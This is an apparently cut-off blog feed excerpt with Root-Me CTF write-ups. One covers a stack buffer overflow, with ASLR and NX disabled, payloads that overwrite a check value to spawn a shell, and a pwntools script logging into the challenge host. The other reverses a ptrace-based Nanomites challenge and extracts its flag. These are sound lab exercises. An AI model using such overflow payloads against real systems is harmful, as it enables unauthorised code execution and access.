    <content type="html"><![CDATA[<h2 id="Sploitfun-Classic-Stack-Based-Buffer-Overflow"><a href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow" class="headerlink" title="Sploitfun-Classic Stack Based Buffer Overflow"></a>Sploitfun-Classic Stack Based Buffer Overflow</h2><p><code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code><br>关闭ASLR<br>具体可见<a href="https://blog.csdn.net/Plus_RE/article/details/79199772">https://blog.csdn.net/Plus_RE/article/details/79199772</a></p><p><code>gcc  -pie      </code>Create a dynamically linked position independent executable.<br>Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作</p><pre><code>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</code></pre><a id="more"></a><p>加上<code>-g</code>选项以后，gcc在编译是会做以下额外的操作：</p><ol><li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li><li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li></ol><p><code>-z execstack </code>禁用NX保护</p><p>详细的保护机制讲解<br><a href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p><p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p><pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`gdb-peda$ help p</code></pre><p>Print value of expression EXP.</p><pre><code>gdb-peda$ p/x $rip</code></pre><p><strong>这个教程太老了，还是32位上的</strong></p><hr><p>*经典root-me *</p><h2 id="ELF-x86-Stack-buffer-overflow-basic-1"><a href="#ELF-x86-Stack-buffer-overflow-basic-1" class="headerlink" title="ELF x86 - Stack buffer overflow basic 1"></a>ELF x86 - Stack buffer overflow basic 1</h2><h3 id="64-Bits-Linux-Stack-Based-Buffer-Overflow"><a href="#64-Bits-Linux-Stack-Based-Buffer-Overflow" class="headerlink" title="64 Bits Linux Stack Based Buffer Overflow"></a>64 Bits Linux Stack Based Buffer Overflow</h3><h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p> So memory addresses are <code>64 bits</code> long, but <code>user space </code>only uses<br>the <code>first 47 bits</code>; keep this in mind because if you specified an<br>address greater than<code> 0x00007fffffffffff</code>, you’ll raise an <code>exception</code>. So<br>that means that 0x4141414141414141 will raise exception, but the<br>address <code>0x0000414141414141</code> is safe. </p><pre><code>64位下，用户空间只用低47位，所以不要超过0x00007fffffffffff</code></pre><hr><pre><code>$./vuln $(python -c &#39;print &quot;A&quot;*300&#39;)gdb-peda$ x/20xg $rsp</code></pre><p><del>栈从高地址往低地址方向 扩展<br>溢出的时候，字符往高地址扩展</del></p><hr><h4 id="leave和ret"><a href="#leave和ret" class="headerlink" title="leave和ret"></a>leave和ret</h4><pre><code>leave = mov esp,ebp ; pop ebpret = pop EIP</code></pre><p>leave 执行后<br><code>指向返回地址</code><br>再<code> pop 将返回地址赋给 EIP</code></p><h4 id="不能控制RIP"><a href="#不能控制RIP" class="headerlink" title="不能控制RIP"></a>不能控制RIP</h4><p>So the program ends and we’re not able to control RIP:( Why?Because we  <code> override   too   much   bits</code>,   remember   biggest   address   is 0x00007fffffffffff and we try to overflow using 0x4141414141414141</p><p>de08-dd00=0x108  ==264</p><h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><pre><code>gdb-peda$ r $(python -c &#39;print &quot;A&quot;*264+&quot;B&quot;*6&#39;)</code></pre><p><del>ASLR 开起来了</del></p><p>输入是”A”*264+”ABCDEF”</p><pre><code>0x7fffffffde28:    0x41    0x42    0x43    0x44    0x45    0x46    0x00    0x00</code></pre><p>是<code>按序</code>填充的</p><p><strong>但有因为小端序，所以又倒序读入RIP</strong><br><code>RIP: 0x464544434241 (&#39;ABCDEF&#39;)</code></p><hr><h4 id="跳转到用户控制的地址"><a href="#跳转到用户控制的地址" class="headerlink" title="跳转到用户控制的地址"></a>跳转到用户控制的地址</h4><p><em>（显然没有开NX）</em></p><pre><code>&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdc\x90&quot;[::-1]</code></pre><p><code>0x7fffffffdc90</code>buf在栈中开始地址</p><p>We  need  to  reverse the  memory  address  because  it’s  a <code> little  endian architecture</code>. That’sexactly what<code>[::-1]</code>does in python.<br>[::-1]逆序</p><hr><p>本题考察了Unix基本输入输出流与缓冲</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> var;</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0x04030201</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line"> </span><br><span class="line">  fgets(buf,<span class="number">45</span>,<span class="built_in">stdin</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, check);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (check == <span class="number">0xdeadbeef</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...\n&quot;</span>);</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Shell closed! Bye.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>标准输入后，还会跟上’\r\n’<br>fgets()读取45-1个字节，或者遇到’\n’停止<br>所以只是溢出4个字节即可，覆盖掉<code>check</code><br><code>0xdeadbeef</code>还需要逆序</p><p><del>但我不知道unix的输入输出流</del><br>payload:(python -c ‘print “a”*40+”DEADBEEF”.decode(“hex”)[::-1]’;cat) | ./ch13<br>得到shell后：<code>cat .passwd</code></p><hr><p>别人使用脚本编写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure><hr><p>关于unix系统输入输出流<br><a href="http://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf" title="stdio buffer">stdio buffer</a><br>参考：<a href="http://showlinkroom.me/2017/11/20/Root-me-App-System01/">http://showlinkroom.me/2017/11/20/Root-me-App-System01/</a></p><pre><code>python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; + &quot;\x00&quot;*4052 + &quot;cat .passwd&quot;&#39; | ./ch13</code></pre><p>将stdin buffer填满，让数据不填入buffer中，留在外面。</p><pre><code>(python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; &#39;; cat ) | ./ch13</code></pre><p>不让当前的数据流中断，不会让输入流关闭的指令，直接使用cat的功能为将输入流复制到输出流中。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Sploitfun-Classic-Stack-Based-Buffer-Overflow&quot;&gt;&lt;a href=&quot;#Sploitfun-Classic-Stack-Based-Buffer-Overflow&quot; class=&quot;headerlink&quot; title=&quot;Sploitfun-Classic Stack Based Buffer Overflow&quot;&gt;&lt;/a&gt;Sploitfun-Classic Stack Based Buffer Overflow&lt;/h2&gt;&lt;p&gt;&lt;code&gt;sudo bash -c &amp;quot;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&amp;quot;&lt;/code&gt;&lt;br&gt;关闭ASLR&lt;br&gt;具体可见&lt;a href=&quot;https://blog.csdn.net/Plus_RE/article/details/79199772&quot;&gt;https://blog.csdn.net/Plus_RE/article/details/79199772&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gcc  -pie      &lt;/code&gt;Create a dynamically linked position independent executable.&lt;br&gt;Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -g -fno-stack-protector -z execstack -o vuln vuln.c&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x64 - Nanomites - Introduction_WP</title>
    <link href="http://finsenty54.github.io/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/"/>
    <id>http://finsenty54.github.io/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/</id>
    <published>2020-10-31T02:39:38.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction-WP"><a href="#ELF-x64-Nanomites-Introduction-WP" class="headerlink" title="ELF x64 - Nanomites - Introduction_WP"></a>ELF x64 - Nanomites - Introduction_WP</h2><p>这是运用了<code>Debug Blocker</code>技术的题目<br>又花了些时间，终于破解了</p><h3 id="gdb-设置跟踪父进程还是子进程"><a href="#gdb-设置跟踪父进程还是子进程" class="headerlink" title="gdb  设置跟踪父进程还是子进程"></a>gdb  设置跟踪父进程还是子进程</h3><p><code>set follow-fork-mode parrent|child</code><br>当发生fork时，指示调试器执行父进程还是子进程</p><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>在程序执行到<code>int3</code>时，就会触发 <code>SIGTRAP </code>信号，</p><a id="more"></a><pre><code> long ptrace(enum __ptrace_request request,             pid_t pid,             void *addr,             void *data);</code></pre><p>参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据</p><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>可以先用strace来观察在系统调用<br><code>strace -i ./ch28.bin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[00007fa5f9b6bf4e] <span class="built_in">read</span>(0, toto  /输入值</span><br><span class="line"><span class="string">&quot;toto\n&quot;</span>, 1024) = 5</span><br><span class="line">[00007fa5f9b75c22] mmap(NULL, 321, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa5f9c8e000</span><br><span class="line">[00007fa5f9b4857b] <span class="built_in">clone</span>(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa5f9c43810) = 131358</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 1&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131358, si_uid=1000, si_status=1, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b48286] wait4(131358, 0x7fff0dde4a1c, 0, NULL) = -1 ECHILD (No child processes)</span><br><span class="line">[00007fa5f9b6bff3] write(1, <span class="string">&quot;Wrong! try hard! :)\n&quot;</span>, 20Wrong! try hard! :)</span><br><span class="line">) = 20</span><br><span class="line">[00007fa5f9b6c087] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)</span><br><span class="line">[00007fa5f9b48759] exit_group(0)        = ?</span><br><span class="line">[????????????????] +++ exited with 0 +++</span><br></pre></td></tr></table></figure><p>当我输入值‘toto’，触发了两次 SIGTRAP，之后退出</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>直接IDA PRO反编译<br>其他的细节都不管，就看我们需要的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400871</span><span class="params">(__int64 input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+F8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+104h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stat_loc = <span class="number">0</span>;</span><br><span class="line">  dest = mmap(<span class="number">0L</span>L, <span class="number">0x141</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);   <span class="comment">// 0x7ffff7ffb000</span></span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, <span class="number">0x8D</span>uLL);                   <span class="comment">// src == 0x601080 指向400ac0( 0x48</span></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )                                   <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;So you want to trace me?!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dest;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(__int64))dest)(input);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0</span>) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)stat_loc == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )               <span class="comment">// 0x57f &gt;&gt;8 =0x5</span></span><br><span class="line">        sub_400736((__int64)dest, pid);</span><br><span class="line">      ptrace(PTRACE_CONT, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0L</span>L, <span class="number">0L</span>L);  <span class="comment">//表示继续执行子进程</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong! try hard! :)&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;POOOOOOOOOOOOOOOOOOOOOOOOO God damn!! You won!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>子进程会执行 memcpy()h函数复制到<code>dest</code>的代码，<code>src == 0x601080</code> 指向<code>400ac0</code>，所以实际复制的是<code>400ac0</code>处的指令。</p><p><a href="https://imgchr.com/i/BUFlQK"><img src="https://s1.ax1x.com/2020/10/31/BUFlQK.jpg" alt="BUFlQK.jpg"></a></p><p><code>RDI </code>保存着我们输入的数据，每次读取一个字节，存入<code>al</code>，之后<code>int3</code>,就会触发SIGTRAP，父进程进行调试子进程。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400736</span><span class="params">(__int64 dest, <span class="keyword">unsigned</span> <span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+10h] [rbp-F0h] 0x7fffffffdc00 ==RAX 子进程寄存器值放在这里</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+90h] [rbp-70h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+A0h] [rbp-60h] 0x400a30 有问题</span></span><br><span class="line">  __int64 dest_1; <span class="comment">// [rsp+F0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// [rsp+FFh] [rbp-1h]</span></span><br><span class="line">                                                <span class="comment">// 0x20cf9 子进程pid</span></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  dest_1 = dest + <span class="number">1</span>;                            <span class="comment">// dest + 1</span></span><br><span class="line">  result = ptrace(PTRACE_GETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 获取值所有寄存器值？？</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )                   <span class="comment">// 13个int 3</span></span><br><span class="line">  &#123;                                             <span class="comment">// rbp-0x8 = i</span></span><br><span class="line">    result = seg_6010A0[<span class="number">3</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( v5 - dest_1 == result )                <span class="comment">// v5 = 0x7ffff7ffb00c </span></span><br><span class="line">                                                <span class="comment">// c-1 = b ==11</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v9++ + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( seg_6010A0[<span class="number">3</span> * i + <span class="number">1</span> + i % <span class="number">2</span>] == v4 )<span class="comment">// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50</span></span><br><span class="line">          v6 |= <span class="number">0x40</span>uLL;                        <span class="comment">// 修改了V6 0x7fffffffdc90 第十八个 表示EFLAGS</span></span><br><span class="line">                                                <span class="comment">// 之前 rax 处 程序 JE zf=0 才不跳转 如果跳转则程序结束</span></span><br><span class="line">        result = ptrace(PTRACE_SETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 设置值</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hummmmmmm NO WAY.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3)</code>获取所有子进程寄存器值，存放在V3地址处。</p><p><code> if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )</code>// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50<br>这条语句就是我们需要的，其将我们的输入值与<code>6010A0</code>处的值进行比较，如果相等，则修改V6，也就是EFLAGS，<code>将ZF置1</code>，<code>JNE不跳转</code>，如果跳转了直接结束进程。</p><p><code>ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3)</code>将修改后的寄存器值重新赋给子进程</p><hr><p>从<code>if</code>知道，比较共进行13次，下面编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">data=[]</span><br><span class="line">flag=[]</span><br><span class="line">print(<span class="string">&quot;give me a bottle of rum!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ch28.txt&#x27;</span>,<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span>(line.find(<span class="string">&#x27;db&#x27;</span>)!=<span class="number">-1</span>):</span><br><span class="line">            pos=line.find(<span class="string">&#x27;db&#x27;</span>)</span><br><span class="line">            item=line[pos+<span class="number">4</span>:pos+<span class="number">6</span>]</span><br><span class="line">            data.append(<span class="built_in">int</span>(item,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    print(<span class="built_in">format</span>(i,<span class="string">&#x27;x&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    flag.append(data[<span class="number">3</span>*i+<span class="number">1</span>+i%<span class="number">2</span>])</span><br><span class="line">print(<span class="string">&#x27;1111111111111111111111111111&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure><p>ch28.txt保存<code>6010A0</code>开始的数据。</p><p><a href="https://imgchr.com/i/BUkHu8"><img src="https://s1.ax1x.com/2020/10/31/BUkHu8.jpg" alt="BUkHu8.jpg"></a><br>运行得到flag</p><p>make -n 显示命令，但不执行</p><hr><h3 id="大佬代码"><a href="#大佬代码" class="headerlink" title="大佬代码"></a>大佬代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;start_with_anything&quot;</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;file ./ch28.bin&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;br *0x40080d&#x27;</span>)</span><br><span 